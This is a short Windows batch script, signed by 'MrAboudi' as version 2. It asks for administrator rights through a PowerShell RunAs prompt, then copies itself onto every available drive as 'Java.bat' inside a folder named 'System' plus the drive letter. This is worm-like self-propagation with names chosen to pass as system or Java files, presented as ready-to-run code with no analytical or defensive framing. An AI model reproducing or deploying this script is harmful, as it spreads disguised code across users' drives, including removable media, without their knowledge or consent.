@echo off
setlocal enabledelayedexpansion

:: Request admin if not elevated
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

set "SELF=%~f0"

for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%D:\" (
        set "FOLDER=System %%D"
        set "FOLDERPATH=%%D:\!FOLDER!"
        set "TARGETBAT=!FOLDERPATH!\Java.bat"

        echo Creating folder "!FOLDERPATH!" on drive %%D
        mkdir "!FOLDERPATH!" 2>nul
        if exist "!FOLDERPATH!" (
            echo Copying script to "!TARGETBAT!"
            copy "%SELF%" "!TARGETBAT!" >nul
            if exist "!TARGETBAT!" (
                echo Successfully copied Java.bat to drive %%D
            ) else (
                echo Failed to copy Java.bat to drive %%D
            )
        ) else (
            echo Failed to create folder on drive %%D
        )
    )
)

pause
exit


:: By MrAboudi
:: v2
